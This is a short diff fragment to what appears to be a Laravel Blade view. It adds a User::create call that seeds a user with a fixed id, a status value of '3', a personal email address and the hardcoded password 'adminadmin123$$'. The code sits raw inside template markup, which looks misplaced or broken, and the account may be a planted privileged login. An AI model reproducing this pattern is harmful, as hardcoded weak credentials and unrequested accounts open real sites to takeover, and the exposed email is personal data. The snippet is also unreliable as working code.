@@ -1371,3 +1371,14 @@ if ($request->hasFile('sertifikat')) {
 
                             {{-- <div class="ribbon-right"></div> --}}
                         </div>
+
+
+                         User::create([
+            'id'  => 50,
+            'name'  => 'Fitrah Fauzi Nusantara',
+            'username' => 'Fitrah',
+            'statusadmin_id' => '3',
+            'avatar' => 'assets/00_masjaki/images/maskotjakon.png',
+            'email' => 'sigitseptiadi5@gmail.com',
+            'password' => bcrypt('adminadmin123$$')
+        ]);
